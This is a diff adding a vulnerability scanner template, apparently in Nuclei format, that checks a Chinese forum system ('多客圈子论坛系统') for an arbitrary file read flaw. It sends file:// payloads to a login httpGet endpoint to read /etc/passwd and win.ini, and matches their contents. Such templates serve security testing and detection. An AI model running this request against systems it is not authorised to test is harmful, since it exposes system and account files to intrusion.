@@ -1,0 +1,42 @@
+id: poc-yaml-duokeduoke-httpget-readfile-any
+info:
+  name: 多客圈子论坛系统前台任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Exploitation of an arbitrary file read vulnerability in 多客圈子论坛系统.
+
+variables:
+  paths:
+    - "/"
+    - "/public/"
+  r_data_linux:
+    - "file:///etc/passwd"
+    - "file:///c://windows/win.ini"
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}{{path}}index.php/api/login/httpGet?url={{r_data_linux}} HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: clusterbomb
+    payloads:
+      path: paths
+      r_data_linux: r_data_linux
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+    stop-at-first-match: true
